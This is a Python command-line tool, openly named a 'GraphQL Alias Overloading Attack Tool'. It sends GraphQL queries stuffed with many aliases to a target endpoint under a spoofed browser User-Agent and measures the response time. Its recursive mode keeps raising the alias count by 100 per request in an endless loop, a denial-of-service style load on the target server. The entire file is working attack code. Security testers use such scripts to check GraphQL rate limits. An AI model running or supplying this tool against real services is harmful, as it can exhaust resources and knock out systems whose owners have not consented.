import requests
import argparse
import time


def generate_alias_query(num_aliases):
    """Generate GraphQL query with alias overloading."""
    aliases = "\n".join([f"invalias{i}:__typename" for i in range(num_aliases)])
    return {
        "query": f"query inv {{ {aliases} }}",
        "operationName": "inv"
    }


def send_graphql_request(target_url, num_aliases, output_file):
    """Send the GraphQL alias overload request and log the response."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Connection": "keep-alive"
    }

    payload = generate_alias_query(num_aliases)
    start_time = time.time()
    try:
        response = requests.post(target_url, json=payload, headers=headers, timeout=10)
        response_time = round(time.time() - start_time, 2)
        
        print(f"\n[+] Sent request to: {target_url}")
        print(f"[+] Alias Count: {num_aliases}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Time: {response_time} seconds")
        print("[+] Response:\n", response.text)

        if output_file:
            with open(output_file, "a") as f:
                f.write(f"\n[+] Sent request to: {target_url}\n")
                f.write(f"[+] Alias Count: {num_aliases}\n")
                f.write(f"[+] Status Code: {response.status_code}\n")
                f.write(f"[+] Response Time: {response_time} seconds\n")
                f.write("[+] Response:\n" + response.text + "\n" + "-"*50 + "\n")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GraphQL Alias Overloading Attack Tool")
    parser.add_argument("-u", "--url", required=True, help="Target website URL")
    parser.add_argument("-p", "--path", required=True, help="GraphQL endpoint path (e.g., /graphql, /api/graphql)")
    parser.add_argument("-a", "--aliases", type=int, default=50, help="Number of aliases to use (default: 50)")
    parser.add_argument("-r", "--recursive", action="store_true", help="Enable recursive mode (increase aliases by 100 until interrupted)")
    parser.add_argument("-o", "--output", help="File to store responses")

    args = parser.parse_args()
    full_url = args.url.rstrip("/") + "/" + args.path.lstrip("/")

    if args.recursive:
        print("[+] Recursive mode enabled. Press Ctrl+C to stop.")
        alias_count = args.aliases
        try:
            while True:
                send_graphql_request(full_url, alias_count, args.output)
                alias_count += 100
        except KeyboardInterrupt:
            print("\n[+] Stopping recursive requests.")
    else:
        send_graphql_request(full_url, args.aliases, args.output)
